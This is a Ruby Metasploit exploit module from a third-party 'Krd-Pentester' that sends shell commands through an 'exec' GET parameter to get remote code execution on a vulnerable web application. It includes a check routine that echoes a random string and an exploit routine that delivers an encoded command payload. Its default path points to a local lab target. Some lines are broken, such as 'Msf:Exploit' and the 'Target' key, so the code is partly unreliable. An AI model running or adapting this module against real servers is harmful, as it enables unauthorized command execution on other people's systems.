##

# This module requires Metasploit: http://metasploit.com/download

# Current source: https://github.com/rapid7/metasploit-framework

##




# Provided By The Stawberry Team V0 #

# Contact Us : github.com/krdsploit

# Twitter : @diyarkrd2


require 'msf/core'


class Metasploit3< Msf::Exploit::Remote

	Rank = ExcellentRanking

	include Msf:Exploit::Remote::HttpClient



	def initialize(info={})
		super(update_info(info,


			'Name' => 'Explotation Against Web App Remote Execution Code',
			'Description' => %q{


				Krd-Pentester Provide This Old School Modules To Explotation Against Web App Remote Execution Code 


			},

			'License' => MSF_LICENSE,

			'Author' => [



				'Provided By Krd-Pentester , Offensive Security Exploit Development On Metasploit Framework'

			],



			'References' => [



				['URL', 'https://github.com/rapid7/metasploit-framework/wiki'],


			],

			'Privileged' => false,

			'Payload' => 

			{


			'Space' => 1000,


			'Disablenops' => true,

			'Compat' => 


			{


				'PayloadType' => 'cmd'

			}



			},


			'Platform' => 'unix',

			'Arch' => 'ARCH_CMD',

			'Target' => 


			[


				['Vulnerable App', { }],



			],


			'DisclosureDate' => "Dec 12 2015",

			'Re-Updated' => "21 Jul 2022",


			'DefaultTarget' => 0))

register_options(



[


	OptString.new('TARGETURI',[true, "The Path Of Vulnerable File", "/Applications/XAMPP/xamppfiles/htdocs/Target_Lab/Remote_Code_Excute.php"]),


],self.class)



end



def check

	txt = Rex::Text.rand_text_alpha(10)

	res = command_exec("echo #{txt}")


	if res && res.body =~ /#{txt}/

		return Exploit::CheckCode::Vulnerable


	else

		return Exploit::CheckCode::Safe


	end


end



def command_exec(shell)


	res = send_request_cgi({



		'method' => 'GET',

		'uri' => normalize_uri(target_uri.path),


		'vars_get' => {





			'exec' => shell


		}





	})


end



def exploit



	command_exec(payload.encoded)



end

end
